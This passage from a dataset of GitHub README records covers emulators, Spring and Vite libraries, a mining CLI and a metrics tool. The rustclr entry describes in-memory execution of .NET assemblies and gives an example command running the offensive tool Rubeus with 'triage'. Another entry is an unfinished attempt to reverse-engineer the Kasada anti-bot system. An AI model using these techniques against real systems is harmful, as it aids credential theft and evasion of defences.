You can also refer to `kruss_matcher.pyi` to see the documentation:

``` python
def find_point_cloud_transformation(
    source_points: np.ndarray, target_points: np.ndarray, voxel_size: float
) -> Tuple[np.ndarray, np.ndarray]:
    """"""
    Finds the transformation (rotation and translation) between two point clouds.

    Args:
        source_points: A 2D numpy array of shape (n, 3), where n is the number of points.
        target_points: A 2D numpy array of shape (n, 3), where n is the number of points.
        voxel_size: A float representing the size of the voxel grid used in the transformation.

    Returns:
        A tuple of two numpy 2D arrays:
            - The first array is the rotation matrix.
            - The second array is the translation matrix.
    """"""
```

## Contributing

Feel free to open issues or submit pull requests if you find bugs or have suggestions for improvements.

## License

This project is open-sourced under the Apache Version 2.0 License.
",0,0,1,Apache-2.0,"build_mac_win.yaml,build_manylinux.yaml",0.0
mateocabanal/riscvm,main,"<div align=""center"" id=""user-content-toc"">
  <ul align=""center"" style=""list-style: none;"">
    <summary>
      <h1 align=""center""> 
        RISCVM 
        <a href=""https://github.com/mateocabanal/riscvm/actions/workflows/rust.yml"">
          <img align=""center"" src=""https://github.com/mateocabanal/riscvm/actions/workflows/rust.yml/badge.svg"" />
        </a>
      </h1>
    </summary>
  </ul>
</div>

<p align=""center""> A RV64GC userspace emulator, written in Rust ü¶Ä. </p>

<hr/>

<h2> Description </h2>

<h4> What is RISCVM? </h4>

<p>
  RISCVM is a userspace emulator. It emulates the RVGC64 unprivileged spec, so this is not meant to run any baremetal software (e.g kernels). 
  It only runs Linux ELF files.
</p>

<h4> How is RISCVM emulating RVGC64? </h4>

<p> RISCVM is an interpreted emulator, but I have plans to implement a JIT for x86_64 and ARM later down the road. </p>

<h2> Installation </h2>

```bash
cargo install --git https://github.com/mateocabanal/riscvm riscvm-runner # Installs the 'riscvm' binary

# OPTIONAL
cargo install --git https://github.com/mateocabanal/riscvm riscvm-debugger # Installs the 'riscvm-debugger' binary
```
<h2> Usage </h2>

`riscvm <ELF_FILE>`

<h2> Features </h2>

- [X] ELF execution
- [X] Support statically linked binaries
- [X] Start libc (gets to `int main()` when using libc)
- [X] Start libstdc++ (gets to `int main()` when using libstdc++ (C++))
- [ ] Start Rust (gets to `fn main()` when using Rust) [see issue](https://github.com/mateocabanal/riscvm/issues/2)
- [ ] Support dynamically linked binaries
- [ ] Multi-threading support
",0,2,1,GPL-3.0,rust.yml,0.0
danvega/spring-boot-oauth-demo,main,"# Spring Boot OAuth2 Login Demo

This project demonstrates how to implement OAuth2 authentication in a Spring Boot application using custom login pages with JTE (Java Template Engine) and Tailwind CSS. It includes both traditional form login and OAuth2 login with Google and GitHub.

## Features

- Custom login page using JTE and Tailwind CSS
- Traditional username/password authentication
- OAuth2 authentication with Google and GitHub
- Protected dashboard page
- User role display
- Secure logout functionality
- CSRF protection

## Prerequisites

- Java 17 or later
- Maven
- Google Cloud account (for Google OAuth)
- GitHub account (for GitHub OAuth)

## Quick Start

1. Clone the repository
```bash
git clone <repository-url>
cd spring-boot-oauth-demo
```

2. Configure OAuth credentials (see OAuth Setup sections below)

3. Set environment variables
```bash
export GOOGLE_CLIENT_ID=your_google_client_id
export GOOGLE_CLIENT_SECRET=your_google_client_secret
export GITHUB_CLIENT_ID=your_github_client_id
export GITHUB_CLIENT_SECRET=your_github_client_secret
```

4. Run the application
```bash
mvn spring-boot:run
```

5. Visit http://localhost:8080

## Default User Credentials

The application comes with a default user for testing:
- Username: `admin`
- Password: `admin123`

## Google OAuth2 Setup

1. Go to [Google Cloud Console](https://console.cloud.google.com/)

2. Create a new project or select an existing one

3. Configure the OAuth consent screen:
   - Go to ""APIs & Services"" > ""OAuth consent screen""
   - Choose ""External"" user type
   - Fill in required information:
      - App name
      - User support email
      - Developer contact information
   - Add scopes: email, profile, openid
   - Add test users if using external user type

4. Create OAuth2 credentials:
   - Go to ""APIs & Services"" > ""Credentials""
   - Click ""Create Credentials"" > ""OAuth client ID""
   - Choose ""Web application""
   - Add these URLs:
     ```
     Authorized JavaScript origins:
     http://localhost:8080

     Authorized redirect URIs:
     http://localhost:8080/login/oauth2/code/google
     ```
   - Note your client ID and client secret

## GitHub OAuth Setup

1. Go to [GitHub Developer Settings](https://github.com/settings/developers)

2. Click ""New OAuth App""

3. Fill in the application details:
   ```
   Application name: Your App Name
   Homepage URL: http://localhost:8080
   Authorization callback URL: http://localhost:8080/login/oauth2/code/github
   ```

4. Register the application

5. Note your client ID and generate a client secret

## Configuration

Create or update `application.yml`:

```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: ${GOOGLE_CLIENT_ID}
            client-secret: ${GOOGLE_CLIENT_SECRET}
            scope:
              - email
              - profile
          github:
            client-id: ${GITHUB_CLIENT_ID}
            client-secret: ${GITHUB_CLIENT_SECRET}
            scope:
              - user:email
              - read:user

```

## Project Structure

```
src/
  main/
    java/
      com.example/
          SecurityConfig.java    # Spring Security configuration
          LoginController.java   # Login handling
          DashboardController.java # Dashboard pages
    resources/
      application.yml           # Application configuration
    jte/
      layout/
        default.jte            # Base template
      pages/
        login.jte             # Login page
        dashboard.jte         # Dashboard page
        home.jte              # Home page
```

## Key Dependencies

```xml
<dependencies>
    <!-- Spring Boot Starters -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-security</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-oauth2-client</artifactId>
    </dependency>
    
    <!-- JTE Template Engine -->
    <dependency>
        <groupId>gg.jte</groupId>
        <artifactId>jte-spring-boot-starter</artifactId>
        <version>3.1.9</version>
    </dependency>
</dependencies>
```

## Troubleshooting

### OAuth2 Issues

1. Redirect URI Mismatch
   - Verify the exact URIs in your OAuth provider settings
   - For Google: `http://localhost:8080/login/oauth2/code/google`
   - For GitHub: `http://localhost:8080/login/oauth2/code/github`
   - No trailing slashes
   - Correct protocol (http/https)
   - Correct port number

2. Authentication Errors
   - Clear browser cookies and cache
   - Check environment variables are set correctly
   - Verify OAuth provider console settings
   - Check application logs for detailed error messages

### Common Issues

1. Login Page Not Loading
   - Verify JTE configuration
   - Check template paths
   - Clear browser cache

2. Authentication Not Working
   - Verify default user credentials
   - Check OAuth configuration
   - Ensure CSRF token is present in forms

## Security Considerations

1. Production Deployment
   - Use HTTPS
   - Update OAuth redirect URIs for production domain
   - Secure client secrets
   - Enable CSRF protection
   - Consider session management settings

2. OAuth Provider Setup
   - Restrict OAuth scopes to minimum required
   - Verify redirect URIs
   - Protect client secrets
   - Use environment variables
",0,2,1,,,1.0
InternetMaximalism/intmax2-mining-cli,main,"# mining-cli

A CLI tool for automatic mining of ITX tokens.

## Overview

mining-cli is a tool that allows users to mine ITX tokens by participating in a simplified version of Intmax2. By utilizing a simplified version of Intmax2 that focuses on deposit and private withdrawal functions, users can contribute to enhancing Ethereum's privacy while earning rewards in ITX tokens.

For more information on mining, please refer to [this article](https://hackmd.io/zNLtkMXXSCernbkTf1BTrQ).

### Minimum Requirements

- Memory: 8GB or more
- CPU: 4 cores or more, with a clock speed of 2 GHz or higher.
  _Note: Some Windows version might have issues while mining. Refer to this [guide](docs/windows.md) to fix it._

## Quick Links

You can find detailed information on how to use the CLI in the following documents:

### [Quick Start for Beginners - Base Mainnet](docs/mainnet-quickstart.md)
_Base Mainnet will be available from 19th Oct 00:00 UTC_

### [Quick Start for Beginners - Base Testnet](docs/quickstart.md)

### [How To Migrate From Ethereum Mainnet To Base](docs/migrate.md)

### [Detailed Documents](docs/developer.md)

### [Terms of Use](docs/terms.md)

## How It Works

<div align=""center"">
  <img src=""assets/diagram.png"" width=""800"" alt=""Mining diagram"">
</div>

1. **Automated Deposits and Withdrawals**: The CLI automatically transfers funds from your deposit address into a simplified Intmax2 system. After a random delay, the funds are withdrawn to your withdrawal address. Through Zero-Knowledge Proofs , the relationship between your deposit and withdrawal addresses remains confidential.

2. **Reward Mechanism**: By participating in these private asset transfers, you contribute to enhancing Ethereum's privacy ecosystem. As a reward for your contribution, you earn ITX tokens. These tokens are distributed weekly to your withdrawal address, available every Monday at 00:00 UTC. Note that rewards are subject to a one-week delay. For instance, mining activities completed on a Sunday will be eligible for claiming not on the immediately following Monday, but on the Monday eight days later.

## About Pending Deposits

ETH enters a pending state immediately after deposit. The admin evaluates it according to AML criteria, and if there are no issues, it is deposited into the simplified intmax2. Deposits rejected by AML criteria are automatically refunded to the deposit address during mining. Pending deposits can be cancelled by running in exit mode.

## Status

During mining, a status message like the following will be displayed. This indicates the state of the deposit account:

```

Deposits: 3 (success: 2 pending: 1 rejected: 0 cancelled: 0) Withdrawn: 2 Eligible: 0 (claimed: 0)

```

The status message components are:

- Deposits: Total number of deposits
- Success: Number of successful deposits
- Pending: Number of deposits awaiting AML analysis
- Rejected: Number of deposits rejected by AML analysis
- Cancelled: Number of cancelled deposits
- Withdrawn: Number of withdrawals
- Eligible: Number of deposits eligible for ITX rewards
- Claimed: Number of deposits for which rewards have been claimed

## Important Notes

### AML Verification

Money deposited into the simplified version of Intmax2 undergoes AML (Anti-Money Laundering) verification. Deposits from suspicious addresses or those made through mixing services like Tornado Cash will be rejected.
You can recover rejected funds by launching the CLI in mining mode or exit mode.

### Token Eligibility

This mining is privacy mining, and addresses that compromise the privacy gained through mining **will be ineligible for mining rewards**.
Specifically, if there are direct or indirect transfers between deposit addresses and withdrawal addresses, the deposit address used for that mining will not be eligible for rewards. You can check whether an deposit address is eligible for rewards in the ""Qualified"" column after selecting the mode.

Here are examples of actions that would make an address **ineligible** for rewards:

- From a wallet A, deposit 1.01 ETH into deposit address #0, and a total of 0.98 ETH is withdrawn to the withdrawal address before mining ends. Then, send 0.98 ETH back to wallet A.

- Deposit 1.01 ETH into deposit address #0, and a total of 0.98 ETH is withdrawn to the withdrawal address before mining ends. Then, deposit this amount into deposit address #1 and mine again.

- Deposit 1.1 ETH into deposit address #0. After mining is completed, 0.09 ETH remains in deposit address #0, which is then sent to the withdrawal address.

<div align=""center"">
  <img src=""assets/diagram2.jpg"" width=""800"" alt=""Mining diagram"">
</div>

## FAQs

Q: Can I lose my mining funds?<br>
A: Your funds are safe as long as you don't lose your withdrawal private key.

Q: Is this process self-custodial?<br>
A: Yes, but the contract is currently upgradable. The intmax team plans to relinquish this ability soon.

Q: What are the costs associated with mining?<br>
A: Gas fees are incurred for each deposit, withdrawal, and claim. The gas fee for withdrawal is deducted from the withdrawn ETH.

Q: What actions will disqualify me from receiving ITX token rewards?<br>
A: Avoid actions that link your deposit and withdrawal addresses. For example, if you directly or indirectly transfer funds from your withdrawal address to your deposit address, you will not be eligible for ITX rewards. Also, using the funds in the withdrawal address for the next mining directly is considered a linking action.

Q: How do I stop the CLI?<br>
A: To stop the CLI, simply press Ctrl+C in the terminal where it's running. This will safely terminate the process. If there is a balance in intmax2, you can withdraw it by running in the exit mode.

Q: An error occurred during execution. What should I do?<br>
A: Feel free to run it again. It's designed to be safe for re-execution.
",22,0,4,,rust-build.yml,36.0
mciem/kasada,main,"<div align=""center"">
  <h1 align=""center"">Kasada Reverse</h1>
  <p align=""center"">
    kasada reverse ( not finished !!! )
    <br />
    <br />
    <a href=""https://github.com/mciem/kasada#-changelog"">üìú ChangeLog</a>
    ¬∑
    <a href=""https://github.com/mciem/kasada/issues"">‚ö†Ô∏è Report Bug</a>
    ¬∑
    <a href=""https://github.com/mciem/kasada/issues"">üí° Request Feature</a>
  </p>
</div>

---

### üìû Contact

- Discord: `mciemmmmmmmmmm`
- Telegram: `t.me/sddasdasdas`

### ‚öôÔ∏è Installation

- Requires: `rust`

---

### üìù Description

My attempt at reversing kasada, not finished

---

### üî• Features

- very fast, bcs its rust and oxc for parsing
- parser
- some other stuff...

---

### üöÄ Milestones

- [X] Make Parser
- [ ] Finish it

---

### üìú ChangeLog

```diff
v1.0.0 ‚ãÆ 04/02/2024
! Initial Release (alpha version)
```

---
",0,0,2,,,2.0
mocks-rs/mocks,main,"# mocks

[![Crates.io](https://img.shields.io/crates/v/mocks.svg)](https://crates.io/crates/mocks)
[![msrv 1.65.0](https://img.shields.io/badge/msrv-1.74.1-dea584.svg?logo=rust)](https://github.com/rust-lang/rust/releases/tag/1.74.1)
[![License](https://img.shields.io/github/license/mocks-rs/mocks)](LICENSE)

Get a mock REST APIs with zero coding within seconds.

## Install

If you're a macOS Homebrew user, then you can install `mocks` from [homebrew-tap](https://github.com/mocks-rs/homebrew-tap).

```shell
brew install mocks-rs/tap/mocks
```

If you're a Rust programmer, `mocks` can be installed with `cargo`.

```shell
cargo install mocks
```

## Usage

### Run a REST API server

Create a `storage.json`.

```json
{
  ""posts"": [
    { ""id"": ""01J7BAKH37HPG116ZRRFKHBDGB"", ""title"": ""first post"", ""views"": 100 },
    { ""id"": ""01J7BAKH37GE8B688PT4RC7TP4"", ""title"": ""second post"", ""views"": 10 }
  ],
  ""comments"": [
    { ""id"": 1, ""text"": ""a comment"", ""post_id"": ""01J7BAKH37HPG116ZRRFKHBDGB"" },
    { ""id"": 2, ""text"": ""another comment"", ""post_id"": ""01J7BAKH37HPG116ZRRFKHBDGB"" }
  ],
  ""profile"": { ""id"": ""01J7BAQE1GMD78FN3J0FJCNS8T"", ""name"": ""mocks"" },
  ""friends"": []
}
```

Pass it to `mocks` CLI.

```shell
mocks storage.json
```

```shell
mocks -H 127.0.0.1 -p 8080 storage.json
```

Get a REST API with `curl`.

```shell
% curl http://localhost:3000/posts/01J7BAKH37HPG116ZRRFKHBDGB
{""id"":""01J7BAKH37HPG116ZRRFKHBDGB"",""title"":""first post"",""views"":100}
```

### Routes

Based on the example [storage.json](storage.json), you'll get the following routes:

```
GET     /posts
GET     /posts/:id
POST    /posts
PUT     /posts/:id
PATCH   /posts/:id
DELETE  /posts/:id

# Same for comments and friends
```

```
GET     /profile
PUT     /profile
PATCH   /profile
```

```
GET     /_hc

# Health check endpoint returns a 204 response.
```

### Options

Run `mocks --help` for a list of options.

### Developer mode

To help with debugging, you can enable a special feature that saves mock data to a separate file. 

To do this, simply set the environment variable called `MOCKS_DEBUG_OVERWRITTEN_FILE`.

```shell
MOCKS_DEBUG_OVERWRITTEN_FILE=storage.debug.json cargo run -- storage.json
```

We recommend specifying the filename as `*.debug.json`. For more details, please check [.gitignore](.gitignore) file.

## LICENSE

This project is licensed under the [MIT license](LICENSE).
",12,2,2,MIT,publish.yml,6.0
HiImJulien/in-vite,master,"<div align=""center"">
  <h1>Welcome to in-vite :crab:</h1>
</div>

## What's in-vite?

`In-vite` is a small library, inspired by Laravel's Vite Plugin. It allows you
to integrate vite's bundling capabilities into your Rust :crab: backend.

## Getting Started :rocket:

```sh
cargo install in-vite
```

The library revolves around the struct `Vite` which handles most aspects and
is required for integration:

```rs

use in_vite::Vite;

fn main() {
  let vite = Vite::default();

  // Retrieve the HTML required to include app.js and it's dependencies.
  let code = vite.make_html(vec![""app.js""]).unwrap();
}

```

> [!IMPORTANT]
> `in-vite` does not setup Vite by itself, rather it expects an already
> setup instance.
> On how to setup Vite read further.

### Setting up Vite :construction:

This library requires an instance of Vite to be already setup. To setup Vite
use your favorite package manager, for example using `npm`:

```sh
npm create vite@latest
```

Next, you need to extend Vite's `vite.config.js`:

```js
// vite.config.js

export default defineConfig({
  build: {
    manifest: true,
    rollupOptions: {
      input: 'app.js'
    },
  }
});

```

The manifest is used in production builds to resolve the appropriate
build artifact.

> [!NOTE]
> You must manually specify entrypoints, since Vite has no `index.html`
> to go from.

### Further configurations

By default, Vite serves assets on `http://localhost:5173`. This and other
defaults can be overwritten by constructing an instance of `Vite` with
`ViteOptions`.

Let's suppose, you're running Vite on port `8090`, you can construct an instance
like this:

```rs

let opts = ViteOptions::default().host(""http://localhost:8090"");

let vite = Vite::with_options(opts);
```

### Mode Configuration

By default `in-vite` is assuming that you're running in development mode,
unless any of the following environemt variables are set to `production`:

```sh
LOCO_ENV=production
# or
RAILS_ENV=production
# or
NODE_ENV=production
```

This behavior can be explicitly overwritten using `ViteOptions`:

```rs
let opts = ViteOptions::default().mode(ViteMode::Production);
let vite = Vite::with_options(opts);
```


## Integrations :world_map:

`in-vite` provides integrations for templating engines such as
[tera](https://github.com/Keats/tera) and
[minijinja](https://github.com/mitsuhiko/minijinja). Which can be activated
using the appropriate feature flag.

### Integration with `tera`

Using the feature flag `tera`, the integration can be activated:

```sh
cargo add in-vite -F tera
```

Integrating Vite is as simple as registering a function with your `tera::Tera`
instance:

```rs

let vite = Vite::default();

let mut tera = tera::Tera::default();
tera.register_function(""vite"", vite);

let template = tera.render_str(r#""{{ vite(resources=""app.js"") }}""#, &tera::Context::new())?;

```

### Integration with `minijinja` :ninja:

Like other integrations, this one can be activated with the feature flag `minijinja`:

```sh
cargo add in-vite -F minijinja
```

```rs
let vite = Vite::default();

let mut env = minijinja::Environment::new();
env.add_global(""vite"", minijinja::Value::from_object(vite));

let template = env.render_str(r#""{{ vite(resources=""app.js"") }}""#, minijinja::Value::UNDEFINED)?;
```

## Contributing

If you consider contributing, then first of all: Thank you! :gift_heart:
The first and simplest way to show your support is to star this repo.

This project accepts bug reports and feature requests via the integrated
[issue tracker](https://github.com/HiImJulien/in-vite/issues). Pull requests
for new integrations are also welcome!

Additionally, code reviews and pointers on how to improve the libraries code
are welcome. This is my first Rust library after all.

## Sponsoring

Thank you for considering sponsoring! While this project does not require
sponsoring, small donations are accepted. 100% of the donations are used to
provide a student (me) :man_student: with a steady supply of caffeinated beverages
which are then metabolized into 100% organic Rust code.

## License

This project is licensed under the MIT license, which you find
[here](https://github.com/HiImJulien/in-vite/blob/master/LICENSE.md).


",0,3,1,MIT,,3.0
xdev-software/vaadin-grid-filter,develop,"[![Published on Vaadin Directory](https://img.shields.io/badge/Vaadin%20Directory-published-00b4f0?logo=vaadin)](https://vaadin.com/directory/component/grid-filter-for-vaadin)
[![Latest version](https://img.shields.io/maven-central/v/software.xdev/vaadin-grid-filter?logo=apache%20maven)](https://mvnrepository.com/artifact/software.xdev/vaadin-grid-filter)
[![Build](https://img.shields.io/github/actions/workflow/status/xdev-software/vaadin-grid-filter/check-build.yml?branch=develop)](https://github.com/xdev-software/vaadin-grid-filter/actions/workflows/check-build.yml?query=branch%3Adevelop)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=xdev-software_vaadin-grid-filter&metric=alert_status)](https://sonarcloud.io/dashboard?id=xdev-software_vaadin-grid-filter)
![Vaadin 24+](https://img.shields.io/badge/Vaadin%20Platform/Flow-24+-00b4f0)

# vaadin-grid-filter

A customizable Vaadin Flow component for filtering Grids.

![demo](assets/demo.png)

## Features
* Customizable and dynamic filter UI
  * Most common filters, operations and value types are supported out of the box
  * Nested filters (AND, OR, NOT)
    * depth can be limited
  * customizable operations (=,>,<,contains,is empty)
  * support for multiple value types
    * can easily be bound with Vaadin components
* Query parameter support
* Support for custom translations

> [!NOTE]
> If you are looking for a simpler component you may check out our [simple-grid-filter](https://github.com/xdev-software/vaadin-simple-grid-filter).

## Usage

Here is a very simple example how the GridFilter can be used:
```java
Grid<Person> grid = createGrid();

GridFilter<Person> filter = GridFilter.createDefault(grid)
  .withFilterableField(""ID"", Person::id, Integer.class)
  .withFilterableField(""First Name"", Person::firstName, String.class);

this.add(filter, grid);
```

To get started further it's recommended to have a look at the [demo](./vaadin-grid-filter-demo).<br/>
A description how to get it running can be found [below](#run-the-demo).

> [!IMPORTANT]
> This component is designed for ""in memory"" filtering of small to medium sized amounts of data.

> [!NOTE]
> Filtering multiple thousand items with complex filtering conditions can drastically impact performance and make the UI unresponsive!<br/> In these cases it's recommended to use backend filtering solutions like database queries or search engines like [ElasticSearch](https://en.wikipedia.org/wiki/Elasticsearch) in combination with a customized UI search framework. If you need help in implementing these feel free to [contact us](https://xdev.software/en/services/support).

## Installation
[Installation guide for the latest release](https://github.com/xdev-software/vaadin-grid-filter/releases/latest#Installation)

#### Compatibility with Vaadin

| Vaadin version | Grid-Filter version |
| --- | --- |
| Vaadin 24+ (latest) | ``1+`` |

## Run the Demo
* Checkout the repo
* Run ``mvn install && mvn -f vaadin-grid-filter-demo spring-boot:run``
* Open http://localhost:8080

<details>
  <summary>Show example</summary>
  
  ![demo](assets/demo.avif)
</details>

## Support
If you need support as soon as possible and you can't wait for any pull request, feel free to use [our support](https://xdev.software/en/services/support).

## Contributing
See the [contributing guide](./CONTRIBUTING.md) for detailed instructions on how to get started with our project.

## Dependencies and Licenses
View the [license of the current project](LICENSE) or the [summary including all dependencies](https://xdev-software.github.io/vaadin-grid-filter/dependencies)
",4,0,5,Apache-2.0,"broken-links.yml,check-build.yml,release.yml,sonar.yml,sync-labels.yml,test-deploy.yml,update-from-template.yml",35.0
joaoviictorti/rustclr,main,"# rustclr ü¶Ä

![Rust](https://img.shields.io/badge/made%20with-Rust-red)
![Platform](https://img.shields.io/badge/platform-windows-blueviolet)
![Forks](https://img.shields.io/github/forks/joaoviictorti/rustclr)
![Stars](https://img.shields.io/github/stars/joaoviictorti/rustclr)
![License](https://img.shields.io/github/license/joaoviictorti/rustclr)

`rustclr` is a powerful library for hosting the Common Language Runtime (CLR) and executing .NET binaries directly with Rust, among other operations.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
  - [Running a .NET Assembly with Configured Flags](#running-a-net-assembly-with-configured-flags)
  - [Advanced Configuration with RustClrEnv and ClrOutput](#advanced-configuration-with-rustclrenv-and-clroutput)
- [Additional Resources](#additional-resources)
- [CLI](#cli)
- [Contributing to rustclr](#contributing-to-rustclr)
- [References](#references)
- [License](#license)

## Features

- ‚úÖ Run .NET binaries in memory with full control over runtime configurations
- ‚úÖ Fine-grained control over the CLR environment and runtime initialization
- ‚úÖ Configure output redirection to capture .NET program output

## Installation

Add `rustclr` to your project by updating your `Cargo.toml`:
```bash
cargo add rustclr
```

Or manually add the dependency:
```toml
[dependencies]
rustclr = ""<version>""
```

## Usage

### Running a .NET Assembly with Configured Flags

The following flags provide full control over your CLR environment and the execution of your .NET assemblies:

- **`.with_runtime_version(RuntimeVersion::V4)`**: Sets the .NET runtime version (e.g., RuntimeVersion::V2, RuntimeVersion::V3, RuntimeVersion::V4). This flag ensures that the assembly runs with the specified CLR version.
- **`.with_output_redirection(true)`**: Redirects the output from the .NET assembly's console to the Rust environment, capturing all console output.
- **`.with_domain(""DomainName"")`**: Sets a custom AppDomain name, which is useful for isolating different .NET assemblies.
- **`.with_args(vec![""arg1"", ""arg2""])`**: Passes arguments to the .NET application, useful for parameterized entry points in the assembly.
  
Using `rustclr` to load and execute a .NET assembly, redirect its output and customize the CLR runtime environment.

```rs
use std::fs;
use rustclr::{RustClr, RuntimeVersion};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Load a sample .NET assembly into a buffer
    let buffer = fs::read(""examples/sample.exe"")?;

    // Create and configure a RustClr instance with runtime version and output redirection
    let output = RustClr::new(&buffer)?
        .with_runtime_version(RuntimeVersion::V4) // Specify .NET runtime version
        .with_output_redirection(true) // Redirect output to capture it in Rust
        .with_domain(""CustomDomain"") // Optionally set a custom application domain
        .with_args(vec![""arg1"", ""arg2""]) // Pass arguments to the .NET assembly's entry point
        .run()?; // Execute the assembly

    println!(""Captured output: {}"", output);

    Ok(())
}
```

### Advanced Configuration with RustClrEnv and ClrOutput

For more fine-grained control, rustclr provides the RustClrEnv and ClrOutput components:

- **`RustClrEnv`**: Allows for low-level customization and initialization of the .NET runtime environment, which is useful if you need to manually control the CLR version, MetaHost, runtime information, and application domain. This struct provides an alternative way to initialize a CLR environment without executing an assembly immediately.
```rs
use rustclr::{RustClrEnv, RuntimeVersion};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create a new environment for .NET with a specific runtime version
    let clr_env = RustClrEnv::new(Some(RuntimeVersion::V4))?;
    println!(""CLR environment initialized successfully with version {:?}"", clr_env.runtime_version);

    Ok(())
}
```

- **`ClrOutput`**: Manages redirection of standard output and error streams from .NET to Rust. This is especially useful if you need to capture and process all output produced by .NET code within a Rust environment.
```rs
use rustclr::{
    RustClrEnv, ClrOutput, 
    InvocationType, Variant
};

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create and initialize the CLR environment
    let clr = RustClrEnv::new(None)?;
    let mscorlib = clr.app_domain.load_lib(""mscorlib"")?;
    let console = mscorlib.resolve_type(""System.Console"")?;

    // Set up output redirection
    let mut clr_output = ClrOutput::new(&mscorlib);
    clr_output.redirect()?;

    // Prepare the arguments
    let args = vec![""Hello World"".to_variant()];

    // Invoke the WriteLine method
    console.invoke(""WriteLine"", None, Some(args), InvocationType::Static)?;

    // Restore the original output and capture redirected content
    clr_output.restore()?;
    let output = clr_output.capture()?;

    print!(""{output}"");

    Ok(())
}
```

## Additional Resources

For more examples, check the [examples](/examples) folder in the repository.

## CLI

`rustclr` also includes a command-line interface (CLI) for running .NET assemblies with various configuration options. Below is a description of the available flags and usage examples.

The CLI accepts the following options:

- **`-f, --file`**: Specifies the path to the .NET assembly file to be executed (required).
- **`-i, --inputs`**: Provides string arguments to be passed to the .NET program's entry point. This flag can be repeated to add multiple arguments.
- **`-r, --runtime-version`**: Sets the .NET runtime version to use. Accepted values include `""v2""`, `""v3""`, and `""v4""`. Defaults to `""v4""`.
- **`-d, --domain`**: Allows setting a custom name for the application domain (optional).

### Example Command

```powershell
clr.exe -f Rubeus.exe -i ""triage"" -i ""/consoleoutfile:C:\Path"" -r v4 -d ""CustomDomain""
```

## Contributing to rustclr

To contribute to **rustclr**, follow these steps:

1. Fork this repository.
2. Create a branch: `git checkout -b <branch_name>`.
3. Make your changes and commit them: `git commit -m '<commit_message>'`.
4. Push your changes to your branch: `git push origin <branch_name>`.
5. Create a pull request.

Alternatively, consult the [GitHub documentation](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests) on how to create a pull request.

## References

- <https://github.com/anthemtotheego/InlineExecute-Assembly>
- <https://github.com/microsoft/windows-rs>

## License

This project is licensed under the MIT License. See the [LICENSE](/LICENSE) file for details.",0,0,1,MIT,,0.0
xsreality/abstractness-instability-calculator,main,"# Abstractness and Instability Metrics Calculator

This application calculates abstractness and instability metrics for Java, Spring Boot projects, helping developers analyze the structure and dependencies of their codebase.

It follows the principles of Spring Modulith by analyzing the [application module packages](https://docs.spring.io/spring-modulith/reference/fundamentals.html#modules.simple). These are direct sub-packages of the _main_ package that contains the `@SpringBootApplication` annotated class. Ideally, these packages are expected to be functional layers rather than technical layers (controller, services, repositories etc.).

A [Nix Flake](#nix-flake) is provided to help build on systems with outdated java and maven installations.

![screenshot](https://github.com/user-attachments/assets/a496037d-62b2-42b5-809f-0eec2f63018a)

Dependency Visualization

![dependency_visualization_recording](https://github.com/user-attachments/assets/83ed8bae-5b0d-4b8c-a356-820e29c3ebad)

## Features

- Scans Spring Boot projects to identify packages and their relationships
- Calculates abstractness, instability, and distance from the main sequence for each package
- Provides a web interface for easy project analysis
- Visualizes results using an interactive scatter plot
- Dependency visualization

## Prerequisites

- Java 22 or higher
- Maven 3.6 or higher

## Installation

1. Clone the repository:
   ```
   git clone https://github.com/xsreality/abstractness-instability-calculator.git
   ```

2. Navigate to the project directory:
   ```
   cd abstractness-instability-calculator
   ```

3. Build the project:
   ```
   mvn clean install
   ```

## Usage

1. Run the application:
   ```
   java -jar target/abstractness-instability-calculator-1.0-SNAPSHOT.jar
   ```

2. Open a web browser and go to `http://localhost:8080`

3. Enter the path to your Java project in the input field

4. Click ""Scan"" to analyze the project

5. View the results in the interactive scatter plot

## Nix Flake

1. Enter development environment
   ```
   nix develop
   ```

2. Build application
   ```
   mvn clean package -DskipTests
   ```

3. Run application
   ```
   java -jar target/abstractness-instability-calculator*.jar
   ```

## Understanding the Results

The scatter plot visualizes three key metrics for each package:

### Instability (I)
- **Range**: 0 to 1
- **Interpretation**: 
  - 0: Maximally stable
  - 1: Maximally unstable
- **Calculation**: I = Ce / (Ca + Ce), where:
  - Ce: Efferent Couplings (outgoing dependencies)
  - Ca: Afferent Couplings (incoming dependencies)
- **Practical Use**: 
  - Helps identify packages that are more likely to change due to changes in other packages.
  - Stable packages (low I) are good candidates for being depended upon.
  - Unstable packages (high I) should generally depend on stable packages to maintain system stability.

### Abstractness (A)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Completely concrete
  - 1: Completely abstract
- **Calculation**: A = (Number of abstract classes and interfaces) / (Total number of classes)
- **Practical Use**:
  - Indicates the level of abstraction in a package.
  - Highly abstract packages (high A) are often more flexible but may be less directly usable.
  - Concrete packages (low A) are typically more immediately usable but may be less flexible.

### Distance from the Main Sequence (D)
- **Range**: 0 to 1
- **Interpretation**:
  - 0: Directly on the Main Sequence (optimal)
  - 1: Furthest from the Main Sequence (problematic)
- **Calculation**: D = |A + I - 1|
- **Practical Use**:
  - Measures how well a package balances abstractness and stability.
  - Packages close to the Main Sequence (low D) are considered well-designed.
  - Helps identify packages that may need refactoring or restructuring.

### Interpreting the Scatter Plot

The plot visualizes these metrics and highlights two important zones:

1. **Zone of Pain** (Bottom-left corner):
   - High stability (low I) and low abstractness (low A)
   - Packages here are difficult to extend and have many dependents
   - Example: A database schema class that many other classes depend on

2. **Zone of Uselessness** (Top-right corner):
   - Low stability (high I) and high abstractness (high A)
   - Packages here are abstract but have no dependents, indicating potentially unused code
   - Example: An over-engineered set of interfaces with no implementations

3. **Main Sequence** (Diagonal line from top-left to bottom-right):
   - Represents an ideal balance between abstractness and instability
   - Packages should aim to be close to this line

### Color Coding
- **Green**: Packages close to the Main Sequence (D ‚â§ 0.5)
- **Red**: Packages far from the Main Sequence (D > 0.5)

### Practical Application
- Use these metrics to identify packages that may need refactoring:
  - Packages in the Zone of Pain might benefit from increased abstraction.
  - Packages in the Zone of Uselessness might need to be made more concrete or removed if unused.
